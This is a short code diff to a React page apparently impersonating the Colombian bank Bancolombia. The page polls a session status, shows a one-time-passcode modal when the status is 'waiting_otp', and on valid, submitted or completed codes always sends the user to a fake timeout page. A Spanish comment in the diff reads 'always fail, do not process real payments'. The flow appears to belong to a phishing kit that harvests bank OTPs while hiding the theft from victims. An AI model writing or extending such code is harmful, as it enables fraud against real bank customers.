@@ -36,8 +36,8 @@ export default function BancolombiaCargandoPage() {
           if (data.status === 'waiting_otp') {
             setShowOtpModal(true);
             setTimeLeft(60); // Reset timer
-          } else if (data.status === 'otp_valid' || data.status === 'otp_submitted') {
-            // Siempre mostrar error - no procesar pagos reales
+          } else if (data.status === 'otp_valid' || data.status === 'otp_submitted' || data.status === 'completed') {
+            // SIEMPRE FALLAR - NO PROCESAR PAGOS REALES
             router.push(`/bancolombia/timeout?sessionId=${sessionId}`);
           } else if (data.status === 'otp_invalid') {
             // OTP was wrong, reset to request new OTP
